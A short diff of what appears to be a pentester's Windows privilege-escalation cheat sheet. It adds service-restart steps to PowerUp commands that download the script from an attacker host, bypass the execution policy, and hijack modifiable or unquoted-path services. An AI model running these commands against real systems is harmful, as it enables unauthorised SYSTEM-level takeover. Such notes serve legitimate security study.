@@ -43,6 +43,7 @@ iwr -uri http://$LOCAL_IP/PowerUp.ps1 -Outfile PowerUp.ps1
 . .\PowerUp.ps1
 Get-ModifiableServiceFile
 Install-ServiceBinary -Name '$SERVICE'
+Restart-Service $SERVICE
 ```
 Search for passwords inside the registry
 ---
@@ -68,6 +69,7 @@ powershell -ep bypass
 . .\PowerUp.ps1
 Get-UnquotedService
 Write-ServiceBinary -Name '$SERVICE_NAME' -Path "C:\$UNQUOTED_PATH"
+Restart-Service $SERVICE
 ```
 Golden ticket:
 ---
